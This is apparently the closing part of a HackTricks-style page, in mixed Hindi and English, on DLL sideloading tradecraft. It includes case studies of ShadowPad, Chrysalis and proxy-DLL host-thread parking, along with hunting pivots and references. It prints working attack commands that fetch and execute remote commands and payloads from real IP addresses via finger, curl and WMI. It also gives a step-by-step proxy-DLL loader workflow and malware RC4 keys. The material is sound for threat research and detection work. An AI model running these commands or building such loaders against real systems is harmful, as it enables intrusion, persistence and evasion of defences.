3. **Encrypted payload blob** – अक्सर same directory में `<name>.tmp` के रूप में stored होता है। Decrypted payload को memory-mapping करने के बाद, loader forensic evidence destroy करने के लिए TMP file delete कर देता है।

Tradecraft notes:

* Signed EXE का नाम बदलना (जबकि PE header में original `OriginalFileName` बना रहता है) इसे Windows binary जैसा masquerade करने देता है, लेकिन vendor signature retain रहती है, इसलिए Ink Dragon की आदत replicate करें जिसमें `conhost.exe` जैसा दिखने वाला binary drop किया जाता है जो असल में AMD/NVIDIA utilities होते हैं।
* क्योंकि executable trusted बना रहता है, अधिकांश allowlisting controls को केवल आपकी malicious DLL को उसके साथ side-by-side रखना होता है। Malicious loader DLL को customize करने पर focus करें; signed parent आमतौर पर untouched चल सकता है।
* ShadowPad का decryptor उम्मीद करता है कि TMP blob loader के पास हो और writable हो ताकि mapping के बाद file को zero किया जा सके। Payload load होने तक directory writable रखें; memory में आने के बाद TMP file को सुरक्षित रूप से delete किया जा सकता है OPSEC के लिए।

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators DLL sideloading को LOLBAS के साथ pair करते हैं ताकि disk पर एकमात्र custom artifact trusted EXE के पास malicious DLL हो:

- **Remote command loader (Finger):** Hidden PowerShell `cmd.exe /c` spawn करता है, Finger server से commands खींचता है, और उन्हें `cmd` को pipe करता है:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` TCP/79 text pull करता है; `| cmd` server response execute करता है, जिससे operators second stage server-side rotate कर सकते हैं।

- **Built-in download/extract:** Benign extension वाला archive download करें, उसे unpack करें, और sideload target plus DLL को random `%LocalAppData%` folder में stage करें:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` progress छुपाता है और redirects follow करता है; `tar -xf` Windows' built-in tar का उपयोग करता है।

- **WMI/CIM launch:** EXE को WMI के जरिए start करें ताकि telemetry में CIM-created process दिखे जबकि वह colocated DLL load करे:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- यह उन binaries के साथ काम करता है जो local DLLs prefer करते हैं (जैसे `intelbq.exe`, `nearby_share.exe`); payload (जैसे Remcos) trusted name के under चलता है।

- **Hunting:** `forfiles` पर alert करें जब `/p`, `/m`, और `/c` एक साथ दिखें; admin scripts के बाहर यह uncommon है।


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

एक recent Lotus Blossom intrusion ने trusted update chain का abuse करके एक NSIS-packed dropper deliver किया, जिसने DLL sideload plus fully in-memory payloads stage किए।

Tradecraft flow
- `update.exe` (NSIS) `%AppData%\Bluetooth` create करता है, इसे **HIDDEN** mark करता है, renamed Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll`, और encrypted blob `BluetoothService` drop करता है, फिर EXE launch करता है।
- Host EXE `log.dll` import करता है और `LogInit`/`LogWrite` call करता है। `LogInit` blob को mmap-load करता है; `LogWrite` उसे custom LCG-based stream से decrypt करता है (constants **0x19660D** / **0x3C6EF35F**, key material prior hash से derived), buffer को plaintext shellcode से overwrite करता है, temps free करता है, और उसमें jump करता है।
- IAT से बचने के लिए, loader export names को hash करके APIs resolve करता है, जिसमें **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, फिर Murmur-style avalanche (**0x85EBCA6B**) लागू करता है और salted target hashes से compare करता है।

Main shellcode (Chrysalis)
- Key `gQ2JR&9;` के साथ पाँच passes में add/XOR/sub repeat करके PE-like main module decrypt करता है, फिर dynamically `Kernel32.dll` → `GetProcAddress` load करके import resolution पूरा करता है।
- Runtime पर per-character bit-rotate/XOR transforms के जरिए DLL name strings reconstruct करता है, फिर `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32` load करता है।
- दूसरा resolver **PEB → InMemoryOrderModuleList** को walk करता है, Murmur-style mixing के साथ हर export table को 4-byte blocks में parse करता है, और hash न मिलने पर ही `GetProcAddress` पर fallback करता है।

Embedded configuration & C2
- Config dropped `BluetoothService` file के अंदर **offset 0x30808** (size **0x980**) पर रहती है और key `qwhvb^435h&*7` से RC4-decrypted होती है, जिससे C2 URL और User-Agent reveal होते हैं।
- Beacons dot-delimited host profile बनाते हैं, tag `4Q` prepend करते हैं, फिर HTTPS पर `HttpSendRequestA` से पहले key `vAuig34%^325hGV` के साथ RC4-encrypt करते हैं। Responses RC4-decrypt होते हैं और tag switch द्वारा dispatch किए जाते हैं (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases)।
- Execution mode CLI args से gated है: no args = `-i` की ओर pointing persistence (service/Run key) install; `-i` self को `-k` के साथ relaunch करता है; `-k` install skip करके payload run करता है।

Alternate loader observed
- Same intrusion ने Tiny C Compiler drop किया और `C:\ProgramData\USOShared\` से `svchost.exe -nostdlib -run conf.c` execute किया, जिसके साथ `libtcc.dll` पास में था। Attacker-supplied C source ने shellcode embed किया, compile किया, और disk पर किसी PE को touch किए बिना in-memory run किया। Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- इस TCC-based compile-and-run stage ने runtime पर `Wininet.dll` import किया और hardcoded URL से second-stage shellcode खींचा, जिससे एक flexible loader मिला जो compiler run की तरह masquerade करता था.

## Signed-host sideloading with export proxying + host thread parking

कुछ DLL sideloading chains **stability engineering** जोड़ते हैं ताकि legitimate host लंबे समय तक alive रहे और malicious DLL load होने के बाद crash करने के बजाय बाद के stages ठीक से load कर सके.

Observed pattern
- एक trusted EXE को malicious DLL के साथ, expected dependency name जैसे `version.dll` के जरिए, साथ में drop करें.
- malicious DLL हर expected export को real system DLL (उदाहरण के लिए `%SystemRoot%\\System32\\version.dll`) की ओर **proxy** करती है, ताकि import resolution सफल रहे और host process काम करता रहे.
- load होने के बाद, malicious DLL **host entry point को patch** करती है ताकि main thread exit होने या process terminate करने वाले code paths चलाने के बजाय infinite `Sleep` loop में फंस जाए.
- एक नया thread असली malicious काम करता है: next-stage DLL name या path को decrypt करना (RC4/XOR common हैं), फिर उसे `LoadLibrary` के साथ launch करना.

Why this matters
- Normal DLL proxying API compatibility बनाए रखता है, लेकिन यह guarantee नहीं करता कि host बाद के stages के लिए लंबे समय तक alive रहेगा.
- main thread को `Sleep(INFINITE)` में park करना signed process को resident बनाए रखने का simple तरीका है, जबकि loader worker thread में decryption, staging, या network bootstrap करता है.
- सिर्फ suspicious `DllMain` को hunt करने से यह pattern miss हो सकता है अगर interesting behavior host entry point patch होने और secondary thread start होने के बाद हो.

Minimal workflow
1. signed host EXE को copy करें और determine करें कि वह local directory से कौन-सी DLL resolve करता है.
2. वही functions export करने वाली proxy DLL बनाएं और उन्हें legitimate DLL की ओर forward करें.
3. `DllMain(DLL_PROCESS_ATTACH)` में एक worker thread create करें.
4. उस thread से host entry point या main thread start routine को patch करें ताकि वह `Sleep` पर loop करे.
5. next-stage DLL name/config को decrypt करें और `LoadLibrary` call करें या payload को manual-map करें.

Defensive pivots
- Signed processes जो `version.dll` या इसी तरह की common libraries को `System32` के बजाय अपनी application directory से load करते हैं.
- image load के तुरंत बाद process entry point पर memory patches, खासकर jumps/calls जो `Sleep`/`SleepEx` की ओर redirect किए गए हों.
- proxy DLL द्वारा बनाए गए threads जो तुरंत decrypted name वाली दूसरी DLL पर `LoadLibrary` call करते हैं.
- vendor executables के साथ writable staging directories जैसे `ProgramData`, `%TEMP%`, या unpacked archive paths में रखी गई full-export proxy DLLs.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)


{{#include ../../../banners/hacktricks-training.md}}
